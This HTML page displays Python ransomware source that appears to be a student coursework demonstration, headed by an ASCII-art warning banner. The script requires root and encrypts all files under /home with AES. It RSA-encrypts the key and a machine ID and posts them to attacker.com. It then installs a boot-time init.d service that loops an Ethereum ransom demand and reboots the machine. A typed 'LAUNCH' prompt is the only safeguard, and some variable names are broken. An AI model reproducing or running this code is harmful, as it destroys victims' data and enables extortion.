<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.10.0/styles/base16/ros-pine.min.css">
<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/python.min.js"></script>

<script>hljs.highlightAll();</script>

<pre><code class="language-python"># Author: Harmony BOUABID
#
# /!\ This code contains potentially malicious malware.
# ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⣡⠴⠦⣌⡹⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
# ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢃⡼⠁⠀⠀⠈⢳⡈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
# ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢁⡞⠁⠀⣼⣧⡀⠈⢳⡌⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
# ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⢡⡞⠀⢀⣼⣿⣿⣷⡀⠀⠹⡄⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
# ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⣰⠏⠀⢀⣾⣿⣿⣿⣿⣷⡄⠀⠹⣆⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
# ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⢰⠏⠀⢀⣾⣿⣿⣿⣿⣿⣿⣿⡀⠀⠸⡆⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
# ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⢰⠏⠀⢀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣷⡄⠀⠹⣆⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
# ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⣰⠏⠀⢠⣾⣿⣿⣿⠟⠛⠛⠻⢿⣿⣿⣿⡄⠀⠘⣦⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
# ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⣼⠃⠀⢠⣿⣿⣿⡟⠁⠀⠀⠀⠀⠀⢹⣿⣿⣿⣆⠀⠘⢧⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
# ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢃⡼⠃⠀⣰⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣆⠀⠈⢳⡘⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
# ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢃⡞⠁⠀⣼⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣧⠀⠈⢳⡈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
# ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⢡⡞⠀⢀⣼⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣧⡀⠀⢻⡌⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
# ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⢠⡏⠀⢀⣼⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀⠹⣆⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
# ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⣰⠏⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠘⣆⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
# ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⣰⠃⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⠘⢦⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
# ⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⡼⠃⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⠀⠈⢧⡘⢿⣿⣿⣿⣿⣿⣿⣿⣿
# ⣿⣿⣿⣿⣿⣿⣿⡿⢃⡼⠁⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠈⢳⡈⢿⣿⣿⣿⣿⣿⣿⣿
# ⣿⣿⣿⣿⣿⣿⡿⢡⡞⠁⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀⠀⢀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡀⠀⢳⡌⢻⣿⣿⣿⣿⣿⣿
# ⣿⣿⣿⣿⣿⡟⢡⠟⠀⢀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀⠹⡄⢻⣿⣿⣿⣿⣿
# ⣿⣿⣿⣿⡟⣰⠏⠀⢀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠛⠛⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡄⠀⠹⣆⠹⣿⣿⣿⣿
# ⣿⣿⣿⡏⢰⡇⠀⢀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠸⣆⢹⣿⣿⣿
# ⣿⣿⠏⣰⠏⠀⢀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡄⠀⠹⣆⠹⣿⣿
# ⣿⠏⣰⠏⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀⢀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠘⢦⠹⣿
# ⠇⡼⠃⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣶⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⠀⠘⢧⠘
# ⠀⣇⠀⠀⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠀⠀⣸⠇
# ⣧⣈⠳⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠖⢋⣼
# ⣿⣿⣷⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣾⣿⣿
# /!\ This code contains potentially malicious malware.
# DO NOT RUN LOCALLY

import secrets
import requests
import os
from math import *
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
import base64

if os.geteuid() != 0: # Ensure script is running as sudo/root
    print("The silicon is craving sudo powers")
    exit()

def generate_id():
    return ''.join([str(secrets.randbelow(10)) for _ in range(16)]) # Cryptographically suitable pseudo random number generation. No obvious PRNG attacks are known.

def generate_key():
    return secrets.token_hex(32)  # 32 hex = 32 bytes = 128bits. We are using AES128, thus we need this exact key size.

def encrypt_file(file_path, key):
    key = bytes.fromhex(key)
    with open(file_path, 'rb') as f:
        data = f.read()

    padded_data = pad(data, AES.block_size) # Pads the data to ensure homogenous aes block sizes

    iv = secrets.token_bytes(16)  # init vector

    cipher = AES.new(key, AES.MODE_CBC, iv) # No ECB mode for obvious reasons. See ECB Penguin.

    encrypted_data = cipher.encrypt(padded_data)

    with open(file_path, 'wb') as f:
        # Write the uniquely generated IV for each file. The IV will be blended with the encrypted data to the untrained eye.
        # The first 16 bytes of each file can, upon decryption, be read and used as the decryption IV with the key.
        f.write(iv + encrypted_data)

    return encrypted_file_path

def rsa_encrypt(plaintext):
    # RSA Encryption with hardcoded public key.
    # The complementary private key is stored privately on my machine
    public_key_pem = """-----BEGIN PUBLIC KEY-----
    MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAyXgZWoZFqG1eC+mXsOC3
    u3n/AZF93tO78FcvsoJ6ybtT8JkR1mlK4OcsOhUdt/acZaCAIIqv54W5odEryqWU
    4LhWCiumpibIL/i0pr7XYWlyeYte8rkIwojWKXtogPwVKfVXh5VRY/FA+j2Jk6g1
    I/M70KtRGne2waXjRj4jSvmaRearIh6zK82BvTBbDFwLfHHfI5xCNGosYRIFuUqn
    6Ro6P/UBli4HR/PcdelOYWlLuG/9mVTA+qCoD900CjxpUY4CMsnpmgDnnKzBLwcP
    fJDyPUUh9/hPpvEDdxzv73ctqhNbhwA0aCbKk4guFflFb/gl4ddlDnFPWpW+H+CK
    MQIDAQAB
    -----END PUBLIC KEY-----"""

    public_key = RSA.import_key(public_key_pem)

    # Use PKCS1_OAEP for modern padding & consistent web format
    cipher = PKCS1_OAEP.new(public_key)

    ciphertext = cipher.encrypt(plaintext.encode('utf-8'))

    # Encode in base64 as a standard
    return base64.b64encode(ciphertext).decode('utf-8')

def send_data(codes):
    url = "https://attacker.com"
    data = {'data': codes.hex()} 
    requests.post(url, data=data)

def gather_files(path):
    # Recursively gathers all files (not folders) with their absolute path in the home folder
    # Not very pythonic to use os commands, but extremely fast and doesn't require any external modules
    return os.popen(f'find /home -type f').read().split("\n")[:-1]

def create_minimal_initd_service(machine_id):
    # Creates a service in init.d that autoruns. It renders the machine unusuable while it is running, 
    # Ensures the user knows where/how much to pay (and what happened if it was not obvious enough).
    # And in general is a pretty funny signature for the hacker
    content = f"""#!/bin/bash
### BEGIN INIT INFO
# Provides: kernel
# Required-Start:
# Required-Stop:
# Default-Start: 2 3 4 5
# Default-Stop:
# Short-Description: Gives you candy and probably chocolate
# Description: Peach candy (they're my favourite)
### END INIT INFO

case "$1" in
    start)
        /bin/bash -c 'while true; do echo "
                         =**=***     
                         ++++*+*     
                    =****++++++      
            #*#**#*++#%***#*++*+     
         %@@@@@@+++++=**+=#++++*     
         %@@@@@@+++++++++++++++*     
         %@@@@@@+++++++++++++++*     
         #@@@@@@+++++=+++++++++*     
           %#%*++=++++++*#*+++++     
               :=+*+++++**+++***     
                 =*+**++++**++==+    
                 +*==========*===*   
                ==*===========+===*  
                 ++*=========*===*+  
                  *+=##***##+#*=*=   
                   *==+**+======*    
                   =========-===*    
                   *=====+======*    
                    =====++=++++*    
                   =**#*+=+----=+    
                  =:::=******#***    
                  **+++**=:::-***    
                         =*****=
Your files have been crypto-locked :( Be a chill guy and send {100+round(int(machine_id)/10**16,6)}ETH\nto the address 0x3CAD38fB0B2323B20XXXXXXXXXXXXXXXXXXXXXXX in the next 72 hours"; sleep 1; done'

        ;;
    *)
        echo 'how did you even manage to reach this'
        ;;
esac
""" # The ETH amount to pay is used for machine identification! The first 6 digits of the uniquely randomly generated id 
    # Are used as the decimals of the ETH amount to send. The less data we need to share between the attacker and the victim,
    # The more secure the operation is. Furthermore, it ensures that even an offline victim can be identified.

    with open("/etc/init.d/kernel", "w") as f:
        f.write(content.strip())

    os.system("chmod 777 /etc/init.d/kernel")
    os.system("update-rc.d kernel defaults")
    os.system("/etc/init.d/kernel start")

def reboot():
    print("Good night :)")
    os.system("reboot")

if __name__ == "__main__":

    if "LAUNCH" != input("This is a security checkpoint for the sake of not running the malware on your own machine.\n This checkpoint would be removed on the main malware. This is just a demonstration\n Please type: LAUNCH"):
        exit()
    machine_id = generate_id()  # Generate the 16-digit ID
    key = generate_key()  # Generate the cryptographic 256-bit key

    for file in gather_files("/home/neowo/263-cybersec/cw/part3/exp/test_malware"): # For every file:
        encrypted_file_path = encrypt_file(file, key)                               # Encrypt said file

    codes = rsa_encrypt(f'id: {machine_id}, key: {key}')                            # RSA Encrypt the id and key with a hardcoder public key

    try:
        send_data(code)    # try to send the id/key to our server
    except:
        with open("key.dat", "w") as f: # if it fails, save it locally.
            f.write(code)               # The rsa encryption therefore has two uses: 
                                        #   - if offline, the victim will have a possibility of decryption strictly upon paying
                                        #   - if online, no firewall/packet sniffer/logs can be used to record and find the id/key sent to the server

    create_minimal_initd_service(machine_id) # Creates a routine that starts upon boot to display a message and render the terminal useless. Also displays information about payment

    reboot() # Reboots the machines for the init.d routine to update and to clear any possible traces in memory of information that could help decryption/identification of the attacker</code></pre>

